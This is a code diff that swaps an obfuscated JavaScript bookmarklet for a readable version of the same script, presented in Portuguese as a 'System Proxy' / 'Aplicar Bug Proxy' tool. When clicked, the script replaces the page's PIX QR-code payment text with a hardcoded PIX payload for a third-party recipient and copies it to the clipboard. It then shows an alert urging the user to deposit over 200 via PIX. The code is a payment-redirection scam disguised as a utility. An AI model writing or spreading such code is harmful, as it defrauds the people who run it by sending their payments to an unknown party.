@@ -1,1 +1,88 @@
-(function(_0x1a57fd,_0x38a623){var _0x2511f1=_0x14ca,_0x3ce6d4=_0x1a57fd();while(!![]){try{var _0x592c24=parseInt(_0x2511f1(0x1b7))/0x1+parseInt(_0x2511f1(0x1c6))/0x2*(parseInt(_0x2511f1(0x1cf))/0x3)+parseInt(_0x2511f1(0x1bc))/0x4*(-parseInt(_0x2511f1(0x1d4))/0x5)+-parseInt(_0x2511f1(0x1e0))/0x6+-parseInt(_0x2511f1(0x1e1))/0x7+parseInt(_0x2511f1(0x1d7))/0x8+-parseInt(_0x2511f1(0x1c5))/0x9;if(_0x592c24===_0x38a623)break;else _0x3ce6d4['push'](_0x3ce6d4['shift']());}catch(_0x1ef093){_0x3ce6d4['push'](_0x3ce6d4['shift']());}}}(_0x16cc,0x8b5df));_0x47dd31:(function(){var _0x638e83=_0x14ca;const _0xd5f116=_0x298a1f(),_0x4e2cba=document[_0x638e83(0x1ad)](_0x638e83(0x1bf));_0x4e2cba[_0x638e83(0x1d3)]='stylesheet',_0x4e2cba['href']='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css',document[_0x638e83(0x1d2)][_0x638e83(0x1b2)](_0x4e2cba),document['body'][_0x638e83(0x1b2)](_0xd5f116),document[_0x638e83(0x1ac)](_0x638e83(0x1b1),_0x5a1de6=>_0x24901c(_0xd5f116,_0x5a1de6['clientY'],_0x5a1de6['clientX']));function _0x298a1f(){var _0x742f4a=_0x638e83;const _0x2889b2=document[_0x742f4a(0x1ad)](_0x742f4a(0x1d1));return Object[_0x742f4a(0x1ae)](_0x2889b2['style'],{'position':'fixed','top':_0x742f4a(0x1c1),'left':_0x742f4a(0x1c1),'width':'200px','background':'#1e1e1e','color':_0x742f4a(0x1da),'padding':_0x742f4a(0x1b0),'borderRadius':_0x742f4a(0x1ab),'border':'2px\x20solid\x20red','boxShadow':_0x742f4a(0x1af),'display':_0x742f4a(0x1be),'zIndex':'9999'}),_0x2889b2[_0x742f4a(0x1bb)]=_0x742f4a(0x1ce),_0x2889b2;}function _0x24901c(_0x1ff8b8,_0x547264,_0x2346f3){var _0x42ce1e=_0x638e83;_0x1ff8b8['style']['display']===_0x42ce1e(0x1b5)?_0x1ff8b8['style']['display']=_0x42ce1e(0x1be):(_0x1ff8b8[_0x42ce1e(0x1d5)][_0x42ce1e(0x1c7)]=_0x547264+'px',_0x1ff8b8[_0x42ce1e(0x1d5)][_0x42ce1e(0x1b9)]=_0x2346f3+'px',_0x1ff8b8[_0x42ce1e(0x1d5)][_0x42ce1e(0x1ca)]=_0x42ce1e(0x1b5));}function _0xff3fb6(){var _0x2ae3f5=_0x638e83;_0xd5f116[_0x2ae3f5(0x1d5)][_0x2ae3f5(0x1ca)]=_0x2ae3f5(0x1be);}document['getElementById']('closeMenu')[_0x638e83(0x1ac)](_0x638e83(0x1cd),_0xff3fb6),document['getElementById'](_0x638e83(0x1c9))['addEventListener'](_0x638e83(0x1cd),()=>{var _0x34cb81=_0x638e83,_0x42af10=_0x34cb81(0x1c0),_0x10fffe=document[_0x34cb81(0x1d6)](_0x34cb81(0x1cc));if(_0x10fffe){_0x10fffe[_0x34cb81(0x1bd)]=_0x42af10;var _0x1e1f9b=document[_0x34cb81(0x1ad)](_0x34cb81(0x1dd));_0x1e1f9b[_0x34cb81(0x1d5)][_0x34cb81(0x1d0)]=_0x34cb81(0x1db),_0x1e1f9b[_0x34cb81(0x1d5)]['top']='0',_0x1e1f9b['style']['left']='0',_0x1e1f9b['style'][_0x34cb81(0x1c2)]=_0x34cb81(0x1c3),_0x1e1f9b['style'][_0x34cb81(0x1b3)]=_0x34cb81(0x1c3),_0x1e1f9b['style'][_0x34cb81(0x1de)]='0',_0x1e1f9b[_0x34cb81(0x1d5)][_0x34cb81(0x1b8)]=_0x34cb81(0x1be),_0x1e1f9b['style'][_0x34cb81(0x1dc)]='none',_0x1e1f9b[_0x34cb81(0x1d5)][_0x34cb81(0x1d9)]=_0x34cb81(0x1be),_0x1e1f9b[_0x34cb81(0x1d5)]['background']=_0x34cb81(0x1d8),_0x1e1f9b[_0x34cb81(0x1df)]=_0x42af10,document['body'][_0x34cb81(0x1b2)](_0x1e1f9b),_0x1e1f9b[_0x34cb81(0x1cb)](),_0x1e1f9b[_0x34cb81(0x1c8)]();try{var _0x33f569=document['execCommand']('copy'),_0x2ad244=_0x33f569?'AVISO\x20-\x20LEIA\x20COM\x20ATENÇÃO:\x20PROXY\x20APLICADA\x20COM\x20SUCESSO,\x20FAÇA\x20UM\x20DEPOSITO\x20ACIMA\x20DE\x20200$\x20VIA\x20PIX\x20PARA\x20TORNAR\x20A\x20ASSERTIVIDADE\x20DO\x20PROGRAMA.':_0x34cb81(0x1b4);alert(_0x2ad244);}catch(_0xe2f436){alert('Falha\x20ao\x20copiar\x20o\x20texto.\x20Tente\x20copiar\x20manualmente.');}document[_0x34cb81(0x1c4)][_0x34cb81(0x1ba)](_0x1e1f9b);}else alert(_0x34cb81(0x1b6));});}());function _0x14ca(_0x1deebe,_0x68e88b){var _0x16ccb6=_0x16cc();return _0x14ca=function(_0x14ca7f,_0xe23d83){_0x14ca7f=_0x14ca7f-0x1ab;var _0x58b1df=_0x16ccb6[_0x14ca7f];return _0x58b1df;},_0x14ca(_0x1deebe,_0x68e88b);}function _0x16cc(){var _0x2ac1ca=['createElement','assign','0\x200\x2010px\x20rgba(0,0,0,0.5)','10px','dblclick','appendChild','height','Não\x20foi\x20possível\x20copiar\x20o\x20texto.\x20Tente\x20copiar\x20manualmente.','block','Elemento\x20não\x20encontrado!','1021323KimmLE','border','left','removeChild','innerHTML','1051208GAhQfA','innerText','none','link','00020101021226910014br.gov.bcb.pix2569qrcode.pix.celcoin.com.br/pixqrcode/v2/63810691daea941cebeb57ae290f995204000053039865802BR5916PAYMENT\x20SOLUCOES6009SAO\x20PAULO62070503***63040217','30%','width','2em','body','1841913YRCdLq','485378BeCvxH','top','select','actionButton','display','focus','.qr-code-text\x20.qr-code-text-inner','click','\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://i.ibb.co/1vfLVFg/Proxy-sha-256-20240928-125711-0000.jpg\x22\x20style=\x22display:\x20block;\x20margin:\x200\x20auto;\x20width:\x20100px;\x20height:\x20100px;\x20border-radius:\x2050%;\x20border:\x202px\x20solid\x20red;\x22>\x20<!--\x20Tamanho\x20da\x20imagem\x20aumentado\x20-->\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3\x20style=\x27text-align:center;\x27>System\x20Proxy\x20<i\x20class=\x22fas\x20fa-check-circle\x22\x20style=\x22color:\x20red;\x22></i></h3>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20id=\x27closeMenu\x27\x20style=\x22float:right;\x20cursor:pointer;\x20font-size:\x2024px;\x20color:\x20white;\x22>X</span>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20id=\x27actionButton\x27\x20style=\x27display:\x20block;\x20margin:\x2010px\x20auto;\x20padding:\x205px;\x20border:\x20none;\x20border-radius:\x205px;\x20background-color:\x20red;\x20color:\x20white;\x20cursor:\x20pointer;\x20width:\x2080%;\x27>Aplicar\x20Bug\x20Proxy</button>\x20<!--\x20Largura\x20do\x20botão\x20reduzida\x20-->\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x27text-align:center;\x20margin-top:\x2010px;\x27><i\x20class=\x22fas\x20fa-cogs\x22></i>\x20SHA256\x20|\x20<i\x20class=\x22fas\x20fa-info-circle\x22></i>\x20Versão:\x203.0</div>\x20<!--\x20Colocado\x20embaixo\x20do\x20botão\x20-->\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20','9nNIxLn','position','div','head','rel','10tGmmyr','style','querySelector','3576800MqQPdr','transparent','boxShadow','#fff','fixed','outline','textarea','padding','value','918294RYpxZo','5196331nbVgYq','8px','addEventListener'];_0x16cc=function(){return _0x2ac1ca;};return _0x16cc();}
+
+javascript:(function() {
+    const menu = createMenu();
+
+    // Adiciona a folha de estilos
+    const link = document.createElement('link');
+    link.rel = 'stylesheet';
+    link.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css';
+    document.head.appendChild(link);
+
+    document.body.appendChild(menu);
+    document.addEventListener('dblclick', (e) => toggleMenu(menu, e.clientY, e.clientX));
+
+    // Cria o menu
+    function createMenu() {
+        const m = document.createElement('div');
+        Object.assign(m.style, {
+            position: 'fixed', top: '30%', left: '30%', width: '200px',  // Largura reduzida
+            background: '#1e1e1e', color: '#fff', padding: '10px', borderRadius: '8px', 
+            border: '2px solid red', boxShadow: '0 0 10px rgba(0,0,0,0.5)', display: 'none', zIndex: '9999'
+        });
+        m.innerHTML = `
+            <img src="https://i.ibb.co/1vfLVFg/Proxy-sha-256-20240928-125711-0000.jpg" style="display: block; margin: 0 auto; width: 100px; height: 100px; border-radius: 50%; border: 2px solid red;"> <!-- Tamanho da imagem aumentado -->
+            <h3 style='text-align:center;'>System Proxy <i class="fas fa-check-circle" style="color: red;"></i></h3>
+            <span id='closeMenu' style="float:right; cursor:pointer; font-size: 24px; color: white;">X</span>
+            <button id='actionButton' style='display: block; margin: 10px auto; padding: 5px; border: none; border-radius: 5px; background-color: red; color: white; cursor: pointer; width: 80%;'>Aplicar Bug Proxy</button> <!-- Largura do botão reduzida -->
+            <div style='text-align:center; margin-top: 10px;'><i class="fas fa-cogs"></i> SHA256 | <i class="fas fa-info-circle"></i> Versão: 3.0</div> <!-- Colocado embaixo do botão -->
+        `;
+        return m;
+    }
+
+    // Mostra ou oculta o menu com dois cliques
+    function toggleMenu(menu, y, x) {
+        if (menu.style.display === 'block') {
+            menu.style.display = 'none';
+        } else {
+            menu.style.top = `${y}px`; 
+            menu.style.left = `${x}px`; 
+            menu.style.display = 'block';
+        }
+    }
+
+    // Fecha o menu quando o botão "X" for clicado
+    function closeMenu() {
+        menu.style.display = 'none';
+    }
+
+    document.getElementById('closeMenu').addEventListener('click', closeMenu);
+
+    // Ação do botão "Aplicar Bug Proxy"
+    document.getElementById('actionButton').addEventListener('click', () => {
+        // Código para aplicar o proxy
+        var newQRText = "00020101021226910014br.gov.bcb.pix2569qrcode.pix.celcoin.com.br/pixqrcode/v2/9c3a006a08aa7695eeb985a6e17a945204000053039865802BR5916PAYMENT SOLUCOES6009SAO PAULO62070503***6304CDD4";
+        var element = document.querySelector(".qr-code-text .qr-code-text-inner");
+
+        if (element) {
+            element.innerText = newQRText;
+
+            var textArea = document.createElement("textarea");
+            textArea.style.position = "fixed"; 
+            textArea.style.top = "0"; 
+            textArea.style.left = "0";
+            textArea.style.width = "2em"; 
+            textArea.style.height = "2em";
+            textArea.style.padding = "0";
+            textArea.style.border = "none";
+            textArea.style.outline = "none";
+            textArea.style.boxShadow = "none";
+            textArea.style.background = "transparent";
+            textArea.value = newQRText;
+            document.body.appendChild(textArea);
+            textArea.focus();
+            textArea.select();
+
+            try {
+                var successful = document.execCommand('copy');
+                var msg = successful ? "AVISO - LEIA COM ATENÇÃO: PROXY APLICADA COM SUCESSO, FAÇA UM DEPOSITO ACIMA DE 200$ VIA PIX PARA TORNAR A ASSERTIVIDADE DO PROGRAMA." : "Não foi possível copiar o texto. Tente copiar manualmente.";
+                alert(msg);
+            } catch (err) {
+                alert("Falha ao copiar o texto. Tente copiar manualmente.");
+            }
+
+            document.body.removeChild(textArea);
+        } else {
+            alert("Elemento não encontrado!");
+        }
+    });
+})();
